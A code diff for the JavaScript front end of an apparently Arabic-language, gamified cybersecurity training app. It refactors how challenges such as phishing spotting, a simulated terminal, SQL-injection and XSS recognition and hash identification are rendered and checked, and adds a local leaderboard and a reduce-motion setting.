+        <button class="btn btn-ghost btn-sm" id="decHint">💡 ${t('hint_cost')}</button>
+        <p id="decHintText" class="hint-text hidden"></p></div>`; break;
+    case 'phishing':
+      html += `<div class="mail-card"><div class="mail-head"><strong class="ltr" style="display:block;">${ch.data.from}</strong>${ch.data.subject}</div>
+        <div class="mail-body">${ch.data.body}</div>
+        <div style="padding:12px;display:flex;gap:8px;flex-wrap:wrap;">
+          <button class="btn btn-danger btn-sm" id="phishYes">⚠️ تصيد احتيالي</button>
+          <button class="btn btn-ghost btn-sm" id="phishNo">✓ بريد آمن</button>
+        </div></div>`; break;
+    case 'terminal':
+      html += `<div class="term-window"><div class="term-body" id="termBody"><div class="term-line">guest@cz:~$ (جرّب: ls ثم cat .secret)</div></div>
+        <div class="term-inputrow"><span class="term-prompt">$</span><input class="term-input" id="termInput" placeholder="command..."></div></div>`; break;
+    case 'password':
+      html += `<div class="panel" style="padding:16px;"><input class="text-input" id="pwInput" placeholder="${t('password')}...">
+        <div class="progress-bar"><div class="progress-fill" id="pwFill" style="width:0%;"></div></div>
+        <p id="pwVerdict" style="margin-top:8px;"></p>
+        <button class="btn btn-cyan btn-sm hidden" id="pwComplete" style="margin-top:8px;">${t('finish')}</button></div>`; break;
+    case 'sqli':
+      html += `<div class="panel" style="padding:16px;"><p>Username: <span class="mono">admin</span></p>
+        <input class="text-input" id="sqliPass" placeholder="Payload..." style="margin-top:8px;">
+        <button class="btn btn-cyan btn-sm" id="sqliLogin">Login</button></div>`; break;
+    case 'log':
+      html += `<div class="panel" style="padding:8px;">${ch.data.logs.map((l,i) => `<div class="log-line mono" data-idx="${i}" style="padding:10px;cursor:pointer;font-size:12px;border-bottom:1px solid var(--line);direction:ltr;text-align:left;">${l.text}</div>`).join('')}
+        </div><button class="btn btn-cyan btn-sm" id="logCheck" style="margin-top:10px;">${t('check')}</button>`; break;
+    case 'xss':
+      html += `<p style="margin-bottom:10px;color:var(--paper-dim);font-size:13px;">${t('select_vuln')}</p>` +
+        ch.data.fields.map((f, i) => `<button class="mc-option" data-idx="${i}"><strong>${f.label}</strong><br><code class="ltr" style="display:block;margin-top:6px;word-break:break-all;">${f.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></button>`).join(''); break;
+    case 'hash':
+      html += `<div class="panel" style="padding:16px;margin-bottom:12px;"><div class="cipher-text">${ch.data.hash}</div></div>
+        <p style="margin-bottom:10px;color:var(--paper-dim);font-size:13px;">${t('pick_answer')}</p>` +
+        ch.data.options.map(o => `<button class="mc-option" data-val="${o}" style="text-align:center;">${o}</button>`).join('') +
+        `<button class="btn btn-ghost btn-sm" id="hashHint" style="margin-top:8px;">💡 ${t('hint_cost')}</button><p id="hashHintText" class="hint-text hidden"></p>`; break;
   }
   v.innerHTML = html;
   if (!done) initChallenge(ch);
@@ -1857,55 +1178,88 @@ function renderChallenge(id) {
 
 function initChallenge(ch) {
   switch(ch.type) {
-    case 'decode': document.getElementById('decCheck').addEventListener('click', () => {
-      if (document.getElementById('decInput').value.trim() === ch.data.answer) { completeChallenge(ch.id); showToast('🎉'); renderChallenge(ch.id); }
-      else showToast('❌');
-    });
-    document.getElementById('decHint').addEventListener('click', () => {
-      const h = document.getElementById('decHintText'); h.textContent = ch.data.hints[0]; h.style.display = 'block';
-    }); break;
-    case 'phishing': document.getElementById('phishYes').addEventListener('click', () => { completeChallenge(ch.id); showToast('🎉'); renderChallenge(ch.id); });
-    document.getElementById('phishNo').addEventListener('click', () => showToast('❌')); break;
-    case 'terminal': document.getElementById('termInput').addEventListener('keydown', function(e) {
-      if (e.key === 'Enter') {
-        const cmd = this.value.trim();
-        const body = document.getElementById('termBody');
-        body.innerHTML += `<div>$ ${cmd}</div>`;
-        if (ch.data.cmds[cmd]) {
-          body.innerHTML += `<div style="color:var(--signal);">${ch.data.cmds[cmd]}</div>`;
-          if (ch.data.cmds[cmd].includes(ch.data.flag)) { completeChallenge(ch.id); showToast('🏆'); renderChallenge(ch.id); }
-        } else body.innerHTML += `<div style="color:var(--alert);">not found</div>`;
-        this.value = ''; body.scrollTop = body.scrollHeight;
-      }
-    }); break;
-    case 'password': document.getElementById('pwInput').addEventListener('input', function() {
-      const pw = this.value; let s = 0;
-      if (pw.length >= 8) s += 25; if (pw.length >= 12) s += 25;
-      if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) s += 25; if (/\d/.test(pw)) s += 15; if (/[^a-zA-Z0-9]/.test(pw)) s += 10;
-      document.getElementById('pwFill').style.width = s + '%';
-      document.getElementById('pwFill').style.background = s >= 100 ? 'var(--signal)' : s >= 60 ? 'var(--warn)' : 'var(--alert)';
-      document.getElementById('pwVerdict').textContent = s >= 100 ? 'قوي ✓' : s >= 60 ? 'متوسط' : 'ضعيف';
-      document.getElementById('pwComplete').style.display = s >= 100 ? 'inline-block' : 'none';
-    });
-    document.getElementById('pwComplete').addEventListener('click', () => { completeChallenge(ch.id); showToast('🔐'); renderChallenge(ch.id); }); break;
-    case 'sqli': document.getElementById('sqliLogin').addEventListener('click', () => {
-      const p = document.getElementById('sqliPass').value.trim();
-      if (ch.data.payloads.some(v => p.toLowerCase().replace(/\s+/g, ' ') === v.toLowerCase().replace(/\s+/g, ' '))) {
-        completeChallenge(ch.id); showToast('💉'); renderChallenge(ch.id);
-      } else showToast('❌');
-    }); break;
-    case 'log': const flagged = new Set();
-    document.querySelectorAll('.log-line').forEach(el => el.addEventListener('click', function() {
-      const idx = parseInt(this.dataset.idx);
-      if (flagged.has(idx)) { flagged.delete(idx); this.style.background = ''; }
-      else { flagged.add(idx); this.style.background = 'var(--alert-soft)'; }
-    }));
-    document.getElementById('logCheck').addEventListener('click', () => {
-      const correct = new Set(ch.data.logs.reduce((a, l, i) => { if (l.sus) a.push(i); return a; }, []));
-      if (correct.size === flagged.size && [...correct].every(v => flagged.has(v))) {
-        completeChallenge(ch.id); showToast('📋'); renderChallenge(ch.id);
-      } else showToast('❌');
-    }); break;
+    case 'decode':
+      document.getElementById('decCheck').addEventListener('click', () => {
+        const val = document.getElementById('decInput').value.trim();
+        if (val === ch.data.answer || val.toUpperCase() === ch.data.answer.toUpperCase()) { completeChallenge(ch.id); showToast('🎉'); renderChallenge(ch.id); }
+        else showToast('❌');
+      });
+      document.getElementById('decHint').addEventListener('click', () => {
+        useHint(ch.id);
+        const h = document.getElementById('decHintText'); h.textContent = ch.data.hints[0]; h.classList.remove('hidden');
+      }); break;
+    case 'phishing':
+      document.getElementById('phishYes').addEventListener('click', () => {
+        if (ch.data.isPhish) { completeChallenge(ch.id); showToast('🎉 ' + ch.data.flags.join(' · ')); renderChallenge(ch.id); }
+        else showToast('❌');
+      });
+      document.getElementById('phishNo').addEventListener('click', () => {
+        if (!ch.data.isPhish) { completeChallenge(ch.id); showToast('🎉'); renderChallenge(ch.id); }
+        else showToast('❌ راجع علامات التصيد بعناية');
+      }); break;
+    case 'terminal':
+      document.getElementById('termInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          const cmd = this.value.trim();
+          const body = document.getElementById('termBody');
+          const l1 = document.createElement('div'); l1.className = 'term-line'; l1.textContent = '$ ' + cmd; body.appendChild(l1);
+          if (ch.data.cmds[cmd]) {
+            const l2 = document.createElement('div'); l2.className = 'term-line'; l2.style.color = 'var(--signal)'; l2.textContent = ch.data.cmds[cmd]; body.appendChild(l2);
+            if (ch.data.cmds[cmd].includes(ch.data.flag)) { completeChallenge(ch.id); showToast('🏆'); setTimeout(() => renderChallenge(ch.id), 600); }
+          } else { const l2 = document.createElement('div'); l2.className = 'term-line'; l2.style.color = 'var(--alert)'; l2.textContent = 'command not found'; body.appendChild(l2); }
+          this.value = ''; body.scrollTop = body.scrollHeight;
+        }
+      }); break;
+    case 'password':
+      document.getElementById('pwInput').addEventListener('input', function() {
+        const pw = this.value; let s = 0;
+        if (pw.length >= 8) s += 25; if (pw.length >= 12) s += 25;
+        if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) s += 25; if (/\d/.test(pw)) s += 15; if (/[^a-zA-Z0-9]/.test(pw)) s += 10;
+        document.getElementById('pwFill').style.width = s + '%';
+        document.getElementById('pwFill').style.background = s >= 100 ? 'var(--signal)' : s >= 60 ? 'var(--warn)' : 'var(--alert)';
+        document.getElementById('pwVerdict').textContent = s >= 100 ? 'قوي ✓' : s >= 60 ? 'متوسط' : 'ضعيف';
+        document.getElementById('pwComplete').classList.toggle('hidden', s < 100);
+      });
+      document.getElementById('pwComplete').addEventListener('click', () => { completeChallenge(ch.id); showToast('🔐'); renderChallenge(ch.id); }); break;
+    case 'sqli':
+      document.getElementById('sqliLogin').addEventListener('click', () => {
+        const p = document.getElementById('sqliPass').value.trim();
+        if (ch.data.payloads.some(v => p.toLowerCase().replace(/\s+/g, ' ') === v.toLowerCase().replace(/\s+/g, ' '))) {
+          completeChallenge(ch.id); showToast('💉'); renderChallenge(ch.id);
+        } else showToast('❌');
+      }); break;
+    case 'log':
+      const flagged = new Set();
+      document.querySelectorAll('.log-line').forEach(el => el.addEventListener('click', function() {
+        const idx = parseInt(this.dataset.idx);
+        if (flagged.has(idx)) { flagged.delete(idx); this.style.background = ''; }
+        else { flagged.add(idx); this.style.background = 'var(--alert-soft)'; }
+      }));
+      document.getElementById('logCheck').addEventListener('click', () => {
+        const correct = new Set(ch.data.logs.reduce((a, l, i) => { if (l.sus) a.push(i); return a; }, []));
+        if (correct.size === flagged.size && [...correct].every(v => flagged.has(v))) {
+          completeChallenge(ch.id); showToast('📋'); renderChallenge(ch.id);
+        } else showToast('❌');
+      }); break;
+    case 'xss':
+      document.querySelectorAll('.mc-option[data-idx]').forEach(btn => btn.addEventListener('click', function() {
+        if (this.dataset.done) return;
+        document.querySelectorAll('.mc-option').forEach(b => b.dataset.done = '1');
+        const idx = parseInt(this.dataset.idx);
+        if (ch.data.fields[idx].vulnerable) { this.classList.add('correct'); completeChallenge(ch.id); showToast('🕷️'); setTimeout(() => renderChallenge(ch.id), 600); }
+        else { this.classList.add('wrong'); showToast('❌'); document.querySelectorAll('.mc-option[data-idx]').forEach(b => { if (ch.data.fields[b.dataset.idx].vulnerable) b.classList.add('correct'); }); }
+      })); break;
+    case 'hash':
+      document.querySelectorAll('.mc-option[data-val]').forEach(btn => btn.addEventListener('click', function() {
+        if (this.dataset.done) return;
+        document.querySelectorAll('.mc-option').forEach(b => b.dataset.done = '1');
+        if (this.dataset.val === ch.data.answer) { this.classList.add('correct'); completeChallenge(ch.id); showToast('🧩'); setTimeout(() => renderChallenge(ch.id), 600); }
+        else { this.classList.add('wrong'); showToast('❌'); document.querySelector(`.mc-option[data-val="${ch.data.answer}"]`).classList.add('correct'); }
+      }));
+      document.getElementById('hashHint').addEventListener('click', () => {
+        useHint(ch.id);
+        const h = document.getElementById('hashHintText'); h.textContent = ch.data.hints[0]; h.classList.remove('hidden');
+      }); break;
   }
 }
 
@@ -1916,6 +1270,22 @@ function renderBadges() {
       const earned = userProgress?.earnedBadges.includes(b.id);
       return `<div class="badge-tile ${earned ? 'earned' : ''}"><div class="ico">${b.icon}</div><div class="nm">${b.name}</div>${earned ? '<span class="tag ok">✓</span>' : ''}</div>`;
     }).join('')}</div>`;
+}
+
+// Deterministic fake trainee roster for local leaderboard flavor.
+const RIVAL_TRAINEES = [
+  { name: 'nyx_0x1', xp: 890 }, { name: 'ghost.sec', xp: 640 }, { name: 'r00tkid', xp: 1450 },
+  { name: 'cipher_fox', xp: 310 }, { name: 'blk_hoodie', xp: 2100 }, { name: 'sec_noor', xp: 175 }
+];
+function renderLeaderboard() {
+  const v = document.getElementById('view');
+  const you = { name: currentUser || t('you'), xp: userProgress?.xp || 0, isYou: true };
+  const rows = [...RIVAL_TRAINEES, you].sort((a, b) => b.xp - a.xp);
+  v.innerHTML = `<div class="module-head"><h1>🏆 ${t('leaderboard')}</h1><p class="desc mono" style="font-size:11.5px;color:var(--paper-faint);">local snapshot</p></div>
+    <div>${rows.map((r, i) => `<div class="lb-row ${r.isYou ? 'you' : ''} ${i === 0 ? 'top' : ''}">
+      <span class="lb-rank">${i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : '#' + (i+1)}</span>
+      <span class="lb-name">${r.isYou ? '⌁ ' + r.name + ' (' + t('you') + ')' : r.name}</span>
+      <span class="lb-xp">${r.xp} XP</span></div>`).join('')}</div>`;
 }
 
 // ==================== SIDE NAV ====================
@@ -1930,9 +1300,12 @@ function initMatrix() {
   resize(); window.addEventListener('resize', resize);
   const chars = '01';
   const fontSize = 14;
-  const columns = Math.floor(canvas.width / fontSize);
-  const drops = Array(columns).fill(1);
-  setInterval(() => {
+  let columns = Math.floor(canvas.width / fontSize);
+  let drops = Array(columns).fill(1);
+  if (matrixTimer) clearInterval(matrixTimer);
+  if (APP.settings.reduceMotion) { canvas.style.opacity = 0; return; }
+  canvas.style.opacity = .4;
+  matrixTimer = setInterval(() => {
     ctx.fillStyle = 'rgba(7,10,9,0.08)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = '#1c8f52'; ctx.font = fontSize + 'px monospace';
     for (let i = 0; i < drops.length; i++) {
@@ -1968,6 +1341,15 @@ function initSettings() {
   document.getElementById('settingsMobileBtn').addEventListener('click', () => modal.classList.add('open'));
   document.getElementById('closeSettings').addEventListener('click', () => modal.classList.remove('open'));
   modal.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('open'); });
+
+  const motionSwitch = document.getElementById('motionSwitch');
+  motionSwitch.addEventListener('click', () => {
+    APP.settings.reduceMotion = !APP.settings.reduceMotion;
+    motionSwitch.classList.toggle('on', APP.settings.reduceMotion);
+    localStorage.setItem('cz_settings', JSON.stringify(APP.settings));
+    initMatrix();
+  });
+
   document.getElementById('saveSettingsBtn').addEventListener('click', () => {
     APP.settings.provider = document.getElementById('providerSelect').value;
     APP.settings.model = document.getElementById('modelInput').value.trim();
@@ -1983,9 +1365,12 @@ function initSettings() {
     document.getElementById('keyStatus').textContent = 'غير محفوظ'; document.getElementById('keyStatus').className = 'tag locked';
   });
   document.getElementById('resetProgressBtn').addEventListener('click', () => {
-    if (confirm('تأكيد إعادة التعيين؟')) { if (currentUser) { userProgress = { completedModules: [], completedQuizzes: {}, completedChallenges: [], earnedBadges: [], bossCompleted: false, xp: 0 }; saveProgress(); } updateAllUI(); navigateTo('home'); modal.classList.remove('open'); }
+    if (confirm('تأكيد إعادة التعيين؟')) {
+      if (currentUser) { userProgress = DEFAULT_PROGRESS(); applyStreak(userProgress); saveProgress(); }
+      updateAllUI(); navigateTo('home'); modal.classList.remove('open');
+    }
   });
-  // Load settings
+
   const saved = JSON.parse(localStorage.getItem('cz_settings') || '{}');
   Object.assign(APP.settings, saved);
   document.getElementById('providerSelect').value = APP.settings.provider;
@@ -1993,25 +1378,27 @@ function initSettings() {
   document.getElementById('apiKeyInput').value = APP.settings.apiKey;
   document.getElementById('keyStatus').textContent = APP.settings.apiKey ? '✓ محفوظ' : 'غير محفوظ';
   document.getElementById('keyStatus').className = APP.settings.apiKey ? 'tag ok' : 'tag locked';
+  motionSwitch.classList.toggle('on', !!APP.settings.reduceMotion);
 }
 
 // ==================== INIT ====================
 document.addEventListener('DOMContentLoaded', () => {
+  const savedSettings = JSON.parse(localStorage.getItem('cz_settings') || '{}');
+  Object.assign(APP.settings, savedSettings);
+
   initMatrix();
   initBoot();
   initSettings();
 
-  // Auth tabs
   document.getElementById('authTabs').addEventListener('click', e => {
     if (e.target.classList.contains('auth-tab')) {
-      document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.auth-tab').forEach(tb => tb.classList.remove('active'));
       e.target.classList.add('active');
       document.getElementById('loginForm').style.display = e.target.dataset.tab === 'login' ? 'block' : 'none';
       document.getElementById('registerForm').style.display = e.target.dataset.tab === 'register' ? 'block' : 'none';
     }
   });
 
-  // Login
   document.getElementById('loginBtn').addEventListener('click', () => {
     const u = document.getElementById('loginUser').value.trim();
     const p = document.getElementById('loginPass').value;
@@ -2020,7 +1407,6 @@ document.addEventListener('DOMContentLoaded', () => {
     else { document.getElementById('authScreen').classList.add('hidden'); navigateTo('home'); updateAllUI(); }
   });
 
-  // Register
   document.getElementById('registerBtn').addEventListener('click', () => {
     const u = document.getElementById('regUser').value.trim();
     const p = document.getElementById('regPass').value;
@@ -2030,38 +1416,33 @@ document.addEventListener('DOMContentLoaded', () => {
     else { document.getElementById('regError').textContent = ''; showToast(t('reg_success')); login(u, p); document.getElementById('authScreen').classList.add('hidden'); navigateTo('home'); updateAllUI(); }
   });
 
-  // Logout
   document.getElementById('logoutBtn').addEventListener('click', () => { closeSideNav(); logout(); });
   document.getElementById('userPill').addEventListener('click', () => openSideNav());
 
-  // Side nav
   document.getElementById('menuToggle').addEventListener('click', openSideNav);
   document.getElementById('navOverlay').addEventListener('click', closeSideNav);
   document.querySelectorAll('.nav-cta[data-nav]').forEach(btn => {
     btn.addEventListener('click', () => { navigateTo(btn.dataset.nav); closeSideNav(); });
   });
 
-  // Bottom nav
   document.getElementById('bottomNav').addEventListener('click', e => {
     const item = e.target.closest('.bottom-nav-item');
     if (item && item.dataset.nav) navigateTo(item.dataset.nav);
   });
 
-  // Language switch
   document.getElementById('langSwitch').addEventListener('click', e => {
-    if (e.target.classList.contains('lang-btn')) {
-      currentLang = e.target.dataset.lang;
-      applyLanguage();
-    }
+    if (e.target.classList.contains('lang-btn')) { currentLang = e.target.dataset.lang; applyLanguage(); }
   });
 
-  // Check saved user
   const savedUser = getSavedUser();
   if (savedUser) {
     const users = getUsers();
     if (users[savedUser]) {
       currentUser = savedUser;
-      userProgress = users[savedUser].progress || { completedModules: [], completedQuizzes: {}, completedChallenges: [], earnedBadges: [], bossCompleted: false, xp: 0 };
+      userProgress = Object.assign(DEFAULT_PROGRESS(), users[savedUser].progress || {});
+      applyStreak(userProgress);
+      users[savedUser].progress = userProgress;
+      saveUsers(users);
       document.getElementById('authScreen').classList.add('hidden');
     }
   }
